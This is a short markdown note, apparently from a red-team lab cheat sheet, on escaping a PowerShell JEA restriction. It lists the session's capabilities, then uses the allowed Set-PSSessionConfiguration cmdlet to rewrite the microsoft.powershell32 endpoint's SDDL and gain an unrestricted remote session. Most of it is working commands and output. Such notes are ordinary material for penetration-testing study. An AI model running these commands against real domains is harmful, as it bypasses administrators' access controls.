### Abuse JEA restriction if Set-PSSessionConfiguration is allowed
```powershell
// Let's get the capabilities

[finance-vanessa.gcbfinance.local]: PS>Get-PSSessionCapability -ConfigurationName ITAccess -Username vanessa

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           clear -> Clear-Host
...
Function        Set-PSSessionConfiguration
...

// Let's change the SDDL of microsoft.powershell32 configuration and allow our user to access

[finance-vanessa.gcbfinance.local]: PS>Set-PSSessionConfiguration -Name microsoft.powershell32 -SecurityDescriptorSddl "O:NSG:BAD:P(A;;GAGXGWGR;;;S-1-5-21-1708299476-1681750518-2103560891-1104)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)"

// Now we can access :D

PS C:\Users\itemployee14\Desktop\PS modules> Enter-PSSession -ComputerName finance-vanessa.gcbfinance.local -ConfigurationName microsoft.powershell32 -Credential finance\vanessa
[finance-vanessa.gcbfinance.local]: PS C:\Users\vanessa\Documents> whoami
finance\vanessa
[finance-vanessa.gcbfinance.local]: PS C:\Users\vanessa\Documents>
```
[ref](https://github.com/HitmanAlharbi/Windows-AD-attacking?tab=readme-ov-file#JEA)